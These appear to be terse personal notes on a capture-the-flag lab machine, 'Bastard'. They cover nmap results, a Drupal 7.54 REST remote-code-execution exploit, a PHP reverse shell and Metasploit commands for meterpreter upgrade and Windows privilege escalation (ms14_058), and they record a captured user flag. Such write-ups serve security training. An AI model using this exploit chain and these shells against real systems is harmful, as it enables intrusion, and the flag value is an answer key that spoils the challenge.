## bastard 10.10.10.9

windows. drupal cms

Microsoft IIS httpd 7.5

80/tcp    open  http    Microsoft IIS httpd 7.5

\| http-methods:

\|\_  Potentially risky methods: TRACE

\| http-robots.txt: 36 disallowed entries \(15 shown\)

\| /includes/ /misc/ /modules/ /profiles/ /scripts/

\| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt

\| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt

\|\_/LICENSE.txt /MAINTAINERS.txt

135/tcp   open  msrpc   Microsoft Windows RPC

49154/tcp open  msrpc   Microsoft Windows RPC

drupal 7.54 exploit

[https://www.ambionics.io/blog/drupal-services-module-rce](https://www.ambionics.io/blog/drupal-services-module-rce)

[https://github.com/mottoin/Drupal-Exploit](https://github.com/mottoin/Drupal-Exploit)

wfuzz megabeast

**10.10.10.9/rest** valdidation

burde nå funke med path /rest og endpoint uforandret

må putte php shell i data tagen

systeminfo, **server 2008 r2 x64**, dual processor

måtte så klart spawne et **windows reverse shell se under**



 **7.php virker**

bruke

[https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse Shell.php](https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse Shell.php) denne funker med shell\_Reverse\_tcp ikke meterpreter.

først reverse shell, så opgpradere til meterpreter

use post/multi/manage/shell\_to\_meterpreter

**gjøre om fra 32 til 64 bit meterpreter = execute -f "c:\windows\sysnative\notepad.exe" og migrate til den pid-en**

exploit/windows/local/ms10\_092\_schelevator - funket ikke

ms16-032 sette 64-bit payload. still no work?

iusr har visst read priv

user.txt **ba22fde1932d06eb76a163d312f921a2**

prøvd token impersonation rottentpotato. no work

use exploit suggester with x86 to reveal some which also work on x64

**use exploit/windows/local/ms14\_058\_track\_popup\_menu**

set target 1 \(x64\)

set payload x64 meterpreter - ikke nødvendig

